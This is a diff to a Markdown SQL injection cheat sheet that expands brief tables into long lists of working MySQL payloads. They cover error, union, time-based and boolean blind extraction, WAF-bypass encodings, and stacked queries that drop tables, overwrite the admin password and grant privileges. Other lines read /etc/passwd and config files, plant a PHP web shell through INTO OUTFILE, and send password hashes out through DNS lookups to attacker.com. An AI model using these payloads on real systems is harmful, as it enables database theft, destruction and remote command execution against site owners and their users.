@@ -271,45 +271,238 @@ WAITFOR DELAY '0:0:5'-- - (MSSQL)
 
 ### **MySQL**
 
-| Type | Payload |
-|------|---------|
-| **Error-Based** | `' AND extractvalue(1,concat(0x7e,version()))-- -` |
-| **Union-Based** | `' UNION SELECT database(),user(),version()-- -` |
-| **Time-Based** | `' AND SLEEP(5)-- -` |
-| **XOR Bypass** | `'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z` |
-| **Boolean** | `' AND 1=1-- -` / `' AND 1=2-- -` |
-| **Read File** | `' UNION SELECT LOAD_FILE('/etc/passwd')-- -` |
-| **Write Shell** | `' UNION SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/shell.php"-- -` |
+' AND extractvalue(1,concat(0x7e,version()))-- -
+' AND extractvalue(1,concat(0x7e,database()))-- -
+' AND extractvalue(1,concat(0x7e,user()))-- -
+' AND extractvalue(1,concat(0x7e,@@version))-- -
+' AND extractvalue(1,concat(0x7e,@@hostname))-- -
+' AND extractvalue(1,concat(0x7e,@@datadir))-- -
+' AND updatexml(1,concat(0x7e,version()),1)-- -
+' AND updatexml(1,concat(0x7e,database()),1)-- -
+' AND updatexml(1,concat(0x7e,user()),1)-- -
+' AND GTID_SUBSET(CONCAT(0x7e,version()),1337)-- -
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))-- -
+' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e,version(),0x7e))x))-- -
+' AND (SELECT * FROM (SELECT NAME_CONST(version(),1)) as x)-- -
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)-- -
+' AND extractvalue(1,concat(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1)))-- -
+' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- -
+' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))-- -
+' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 0,1)))-- -
+' AND updatexml(1,concat(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1)),1)-- -
+' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)),1)-- -
+' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)),1)-- -
+' AND updatexml(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 0,1)),1)-- -
+' AND extractvalue(1,concat(0x7e,@@version_comment))-- -
+' AND extractvalue(1,concat(0x7e,@@basedir))-- -
+' AND extractvalue(1,concat(0x7e,@@tmpdir))-- -
+' AND updatexml(1,concat(0x7e,@@hostname),1)-- -
+' AND updatexml(1,concat(0x7e,@@version_compile_os),1)-- -
+' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)))-- -
+' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -
 
-### **PostgreSQL**
+**Union-Based**
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT 1,2,3-- -
+-1' UNION SELECT 1,2,3-- -
+' UNION SELECT database(),user(),version()-- -
+' UNION SELECT schema(),current_user(),@@version-- -
+' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()-- -
+' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT GROUP_CONCAT(table_name),2,3 FROM information_schema.tables WHERE table_schema=database()-- -
+' UNION SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT username,password,3 FROM users-- -
+' UNION SELECT GROUP_CONCAT(username,0x3a,password),2,3 FROM users-- -
+' UNION SELECT CONCAT(username,0x3a,password),2,3 FROM users LIMIT 1-- -
+' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -
+' UNION SELECT LOAD_FILE('/var/www/html/config.php'),2,3-- -
+' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini'),2,3-- -
+' UNION SELECT @@basedir,@@datadir,@@hostname-- -
+' UNION SELECT user,host,password FROM mysql.user-- -
+' UNION SELECT grantee,privilege_type,is_grantable FROM information_schema.user_privileges-- -
+' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%pass%'-- -
+' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%user%'-- -
+' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%mail%'-- -
+' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_schema=database()-- -
+' UNION SELECT variable_name, variable_value,1 FROM performance_schema.global_variables-- -
+' UNION SELECT event_name,current_count,high_count FROM performance_schema.events_waits_summary_global_by_event_name-- -
+' UNION SELECT object_schema,object_name,object_type FROM performance_schema.table_handles-- -
+' UNION SELECT table_schema,table_name,create_time FROM information_schema.tables-- -
+' UNION SELECT routine_name,routine_type,created FROM information_schema.routines-- -
+' UNION SELECT trigger_name,event_manipulation,action_timing FROM information_schema.triggers-- -
+' UNION SELECT table_name,constraint_name,constraint_type FROM information_schema.table_constraints-- -
+' UNION SELECT COLUMN_NAME,COLUMN_TYPE,IS_NULLABLE FROM information_schema.COLUMNS WHERE TABLE_NAME='users'-- -
 
-| Type | Payload |
-|------|---------|
-| **Error-Based** | `' AND 1=CAST(version() AS INT)-- -` |
-| **Union-Based** | `' UNION SELECT current_database(),current_user,version()-- -` |
-| **Time-Based** | `' AND pg_sleep(5)-- -` |
-| **Boolean** | `' AND 1=1-- -` / `' AND 1=2-- -` |
-| **Read File** | `' UNION SELECT pg_read_file('/etc/passwd',0,1000)-- -` |
+**Time-Based**
+' AND SLEEP(1)-- -
+' AND SLEEP(2)-- -
+' AND SLEEP(3)-- -
+' AND SLEEP(4)-- -
+' AND SLEEP(5)-- -
+' AND SLEEP(6)-- -
+' AND SLEEP(7)-- -
+' AND SLEEP(8)-- -
+' AND SLEEP(9)-- -
+' AND SLEEP(10)-- -
+' AND SLEEP(15)-- -
+' AND SLEEP(20)-- -
+' AND SLEEP(25)-- -
+' AND SLEEP(30)-- -
+' AND (SELECT SLEEP(5))-- -
+' AND (SELECT SLEEP(5) FROM DUAL)-- -
+' AND (SELECT SLEEP(5) WHERE 1=1)-- -
+' AND (SELECT 1 FROM (SELECT SLEEP(5)) a)-- -
+' AND IF(1=1, SLEEP(5), 0)-- -
+' AND IF(1=2, SLEEP(5), 0)-- -
+' AND IF(ASCII(SUBSTR(database(),1,1))>64, SLEEP(5), 0)-- -
+' AND IF(ASCII(SUBSTR(database(),1,1))>96, SLEEP(5), 0)-- -
+' AND IF(ASCII(SUBSTR(database(),1,1))>112, SLEEP(5), 0)-- -
+' AND IF(ASCII(SUBSTR(database(),1,1))=112, SLEEP(5), 0)-- -
+' AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END-- -
+' AND CASE WHEN 1=2 THEN SLEEP(5) ELSE 0 END-- -
+' AND IF((SELECT LENGTH(database()))>5, SLEEP(5), 0)-- -
+' AND IF((SELECT COUNT(*) FROM users)>10, SLEEP(5), 0)-- -
+' AND BENCHMARK(1000000,MD5('a'))-- -
+' AND BENCHMARK(5000000,MD5('a'))-- -
+' AND BENCHMARK(10000000,MD5('a'))-- -
+' AND BENCHMARK(50000000,MD5('a'))-- -
+' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C)-- -
+'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+'XOR(if(1=1,sleep(5),0))XOR'Z
+'XOR(if(now()=sysdate(),sleep(5),0))OR'
+0'|(IF((now())LIKE(sysdate()),SLEEP(5),0))|'Z
+'XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR'Z
+(SELECT(0)FROM(SELECT(SLEEP(5)))a)
+1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)
 
-### **MSSQL**
+**Boolean Blind **
 
-| Type | Payload |
-|------|---------|
-| **Error-Based** | `' AND 1=CONVERT(INT, @@version)-- -` |
-| **Union-Based** | `' UNION SELECT @@version,DB_NAME(),system_user-- -` |
-| **Time-Based** | `' WAITFOR DELAY '0:0:5'-- -` |
-| **Boolean** | `' AND 1=1-- -` / `' AND 1=2-- -` |
-| **Command Exec** | `' EXEC xp_cmdshell 'whoami'-- -` |
+' AND 1=1-- -
+' AND 1=2-- -
+' AND '1'='1-- -
+' AND '1'='2-- -
+' OR 1=1-- -
+' OR 1=2-- -
+' OR '1'='1-- -
+' OR '1'='2-- -
+" AND "1"="1-- -
+" AND "1"="2-- -
+" OR "1"="1-- -
+" OR "1"="2-- -
+` AND `1`=`1-- -
+` AND `1`=`2-- -
+` OR `1`=`1-- -
+` OR `1`=`2-- -
+' AND 1=1#
+' AND 1=2#
+' OR 1=1#
+' OR 1=2#
+' AND '1'='1#
+' AND '1'='2#
+' OR '1'='1#
+' OR '1'='2#
+' AND LENGTH(database())=1-- -
+' AND LENGTH(database())=2-- -
+' AND LENGTH(database())=3-- -
+' AND LENGTH(database())=4-- -
+' AND LENGTH(database())=5-- -
+' AND LENGTH(database())=6-- -
+' AND LENGTH(database())=7-- -
+' AND LENGTH(database())=8-- -
+' AND LENGTH(database())=9-- -
+' AND LENGTH(database())=10-- -
+' AND ASCII(SUBSTR(database(),1,1))>64-- -
+' AND ASCII(SUBSTR(database(),1,1))>96-- -
+' AND ASCII(SUBSTR(database(),1,1))>112-- -
+' AND ASCII(SUBSTR(database(),1,1))=112-- -
 
-### **Oracle**
 
-| Type | Payload |
-|------|---------|
-| **Error-Based** | `' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version))-- -` |
-| **Union-Based** | `' UNION SELECT banner FROM v$version WHERE ROWNUM=1-- -` |
-| **Time-Based** | `' AND DBMS_LOCK.SLEEP(5)-- -` |
-| **Boolean** | `' AND 1=1-- -` / `' AND 1=2-- -` |
+**WAF Bypass**
+'/**/AND/**/1=1-- -
+'/**/AND/**/1=2-- -
+'/**/OR/**/1=1-- -
+'/**/OR/**/1=2-- -
+'/**/AND/**/SLEEP(5)-- -
+'%0aAND%0a1=1-- -
+'%0aAND%0a1=2-- -
+'%0aOR%0a1=1-- -
+'%0aOR%0a1=2-- -
+'%0aAND%0aSLEEP(5)-- -
+'%09AND%091=1-- -
+'%09AND%091=2-- -
+'%09OR%091=1-- -
+'%09OR%091=2-- -
+'%09AND%09SLEEP(5)-- -
+' aNd 1=1-- -
+' aNd 1=2-- -
+' AnD 1=1-- -
+' AnD 1=2-- -
+' oR 1=1-- -
+' oR 1=2-- -
+' Or 1=1-- -
+' Or 1=2-- -
+' uNiOn SeLeCt 1,2,3-- -
+' UnIoN sElEcT 1,2,3-- -
+%27%20AND%201=1--%20-
+%27%20AND%201=2--%20-
+%27%20OR%201=1--%20-
+%27%20OR%201=2--%20-
+%27%20AND%20SLEEP(5)--%20-
+%27%20UNION%20SELECT%201,2,3--%20-
+%2527%2520AND%25201=1--%2520-
+%2527%2520AND%25201=2--%2520-
+%2527%2520OR%25201=1--%2520-
+%2527%2520OR%25201=2--%2520-
+%2527%2520AND%2520SLEEP(5)--%2520-
+%2527%2520UNION%2520SELECT%25201,2,3--%2520-
+'/*!50000AND*/ 1=1-- -
+'/*!50000OR*/ 1=1-- -
+'/*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -
 
+
+Stacked Queries (15 Payloads)
+sql
+; SELECT 1-- -
+; SELECT database()-- -
+; SELECT user()-- -
+; SELECT version()-- -
+; SELECT schema()-- -
+; SELECT @@version-- -
+; DROP TABLE users-- -
+; INSERT INTO users VALUES ('hacker','pass')-- -
+; UPDATE users SET password='hacked' WHERE username='admin'-- -
+; DELETE FROM users WHERE username='test'-- -
+; CREATE TABLE test(id INT)-- -
+; ALTER TABLE users ADD COLUMN backdoor VARCHAR(100)-- -
+; TRUNCATE TABLE logs-- -
+; SELECT * INTO backup FROM users-- -
+; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'localhost'-- -
+File Operations (10 Payloads)
+sql
+' UNION SELECT LOAD_FILE('/etc/passwd')-- -
+' UNION SELECT LOAD_FILE('/var/www/html/config.php')-- -
+' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini')-- -
+' UNION SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')-- -
+' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"-- -
+' UNION SELECT "<?php phpinfo(); ?>" INTO OUTFILE "/var/www/html/info.php"-- -
+' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/shell.php'-- -
+' UNION SELECT LOAD_FILE('/etc/passwd') INTO DUMPFILE '/tmp/passwd_copy'-- -
+SELECT * FROM users INTO OUTFILE '/tmp/users.txt'-- -
+SELECT * FROM users INTO DUMPFILE '/tmp/users.dump'-- -
+Out-of-Band (5 Payloads)
+sql
+' AND LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a.txt'))-- -
+' AND LOAD_FILE(CONCAT('//',version(),'.attacker.com/a.txt'))-- -
+' AND LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\test'))-- -
+' AND LOAD_FILE(CONCAT('\\\\',(SELECT table_name FROM information_schema.tables LIMIT 1),'.attacker.com\\out'))-- -
+SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\hash'))-- -
 ---
 
 ## 🔴 **WAF BYPASS TECHNIQUES**
